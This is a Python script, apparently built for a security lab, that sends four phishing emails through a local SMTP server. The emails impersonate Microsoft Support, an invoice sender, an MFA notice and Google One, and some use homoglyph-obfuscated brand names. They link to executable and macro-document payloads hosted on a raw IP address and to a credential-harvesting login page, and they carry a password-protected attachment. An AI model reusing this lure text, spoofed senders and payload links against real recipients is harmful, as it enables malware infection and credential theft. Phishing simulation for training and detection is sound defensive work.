import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

def send_email(subject, to_email, from_email, attachment=None, url="", link_text="", body_version=0):
    # Define different email bodies for each version
    plain_texts = [
        """Hello Diya,

I hope this email finds you well. We would like to inform you that security updates regarding vulnerabilities for the month of April from Microsoft have been shared with you as an attachment.

Please review the attached file for detailed information about the security updates.

If you have any questions or need further assistance, please feel free to contact us at {from_email}

Best regards,
John
Microsoft Support""",
        """Hello Jayne,

I hope this email finds you well. Attached is the invoice for your February membership fee.

If you have any questions about any of the items on the invoice or need more information, please do not hesitate to contact me.

Thank you for your attention, and have a great week ahead!

Best regards,
Jake
Cyber Community""",
        """Hi Monica,

To enhance the security of your account, we have initiated the Multi-Factor Authentication (MFA) activation process. As part of this process, we are sending you a One-Time Passcode (OTP).

One-Time Passcode (OTP): 18075

Please use the provided OTP to complete the MFA activation. If you did not initiate this process or have any concerns, please contact our customer support immediately.


Date : Feb 13, 2024 02:01:10 
IP : 113.161.158.12
OS : Windows
Browser : Chrome
Location : Hanoi, Ha Noi


Best regards,
Nuvelab's  {from_email}""",
        """What is Gǝɟɓʇoogǝɟɓʇle One?
ǝɟɓʇGoǝɟɓʇogǝɟɓʇle One is a membership that offers expanded storage, access to experts, and more all in one shareable plan.
 
Your Gmaiǝɟɓʇl is full
Red warning triangle
You're out of storage and may not receive new emails
 
100% full
	
15 of 15 GB Used
nbsp;
You have emails at Elliot@letsdefend.io. Get more storage now with a Goǝɟɓʇogǝɟɓʇle One membership. Plans start at just $1.99 a month. Email us at {from_email}.

Kind regards,
Google.com-one"""
    ]

    html_bodies = [
        f"""<html>
    <body>
        <p>Hello Diya,</p>
        <p>I hope this email finds you well. We would like to inform you that security updates regarding vulnerabilities for the month of April from Microsoft have been shared with you as an attachment.</p>
	<p>Please review the attached file for detailed information about the security updates.</p>
        <p>If you have any questions or need further assistance, please feel free to contact us at <a href="mailto:{from_email}">{from_email}</a>.</p>
        <p>Regards,<br><strong>John</strong><br>Microsoft Support</p>
        <p>Attachments Password: infected</p>
        <p><p><a href="{url}"><img src="http://localhost/folder.png" alt="File Icon" style="vertical-align:middle; margin-right: 5px;">{link_text}</a>Click here to download the detailed file</a></p>
        <p>Best regards,</p>
        <p>John</p>
        <p>Microsoft Support</p>
    </body>
</html>""",
        f"""<html>
    <body>
        <p>Hello Jayne,</p>
        <p>I hope this email finds you well. Attached is the invoice for your February membership fee.</p>
        <p>If you have any questions about any of the items on the invoice or need more information, please do not hesitate to contact me. <a href="mailto:{from_email}">{from_email}</a> for assistance.</p>
	<p>Thank you for your attention, and have a great week ahead!</p>
        <p>Best regards,<br><strong>Jake</strong><br>Cyber Community</p>
        <p>Attachments Password: infected</p>
        <p><a href="{url}">Click here for more details</a></p>
    </body>
</html>""",
        f"""<html>
    <body>
        <p>Hi Monica,</p>
        <p>To enhance the security of your account, we have initiated the Multi-Factor Authentication (MFA) activation process. As part of this process, we are sending you a One-Time Passcode (OTP).
</p>
        <p>One-Time Passcode (OTP): 18075</p>
	<p>Please use the provided OTP to complete the MFA activation. If you did not initiate this process or have any concerns, please contact our customer support immediately.</p>
	<p>Date : Feb 13, 2024 02:01:10</p>
	<p>IP : 113.161.158.12</p>
	<p>OS : Windows</p>
	<p>Browser : Chrome</p>
	<p>Location : Hanoi, Ha Noi</p>

        <p>Best regards,<br><strong>Nuvelab's</strong><br>Support</p>
    </body>
</html>""",
        f"""<html>
    <body>
        <p>Greetings Kevin,</p>
        <p>What is Googel One?</p>
	<p>Google One is a membership that offers expanded storage, access to experts, and more all in one shareable plan.</p>
        <p>Your Gmail is full</p>
	<p>Red warning triangle</p>
	<p>100% full</p>
	<p>15 of 15 GB Used</p>
	<p>You're out of storage and may not receive new emails</p>
	<p>Plans start at just $1.99 a month.</p>
    <p><a href="{url}">Click here for more details</a></p>
        <p>Kind regards,<br><strong>one</strong><br>google-one Support</p>
    </body>
</html>>"""
    ]

    msg = MIMEMultipart('alternative')
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject

    # Attach both plain text and HTML versions
    msg.attach(MIMEText(plain_texts[body_version], 'plain'))
    msg.attach(MIMEText(html_bodies[body_version], 'html'))

    # Handling the attachment
    if attachment:
        try:
            with open(attachment, 'rb') as file:
                part = MIMEApplication(file.read(), Name=attachment)
                part['Content-Disposition'] = f'attachment; filename="{attachment}"'
                msg.attach(part)
        except Exception as e:
            print(f"Failed to attach file: {e}")
            return

    # Setting up the SMTP server
    try:
        server = smtplib.SMTP('localhost', 1025)  # Adjust as needed for your SMTP server
        server.send_message(msg)
        server.quit()
        print("Email sent successfully")
    except Exception as e:
        print(f"Failed to send email: {e}")

# List of sender emails - update these with actual email addresses later
senders = ['john@microsoftupdatehost.hopto.org', 'Jake@cybersec.com', 'midland labs@midland pro.com', 'noreply@googleone.com']
urls = ['http://4.240.99.109/Digimemoryupdate.exe', 'http://4.240.99.109/edit1-invoice.docm.zip', 'http://4.240.99.109/Order_Spesification.zip', 'https://gptchamarajnagar.000webhostapp.com/login.html']

# Send 4 emails with 1 minute intervals
for i in range(4):
    send_email('Security Update Notification', 'diya@example.com', senders[i], '/var/www/html/client.zip', urls[i], 'Click here for more details', i)
    time.sleep(10)  # Wait for 1 minute before sending the next email

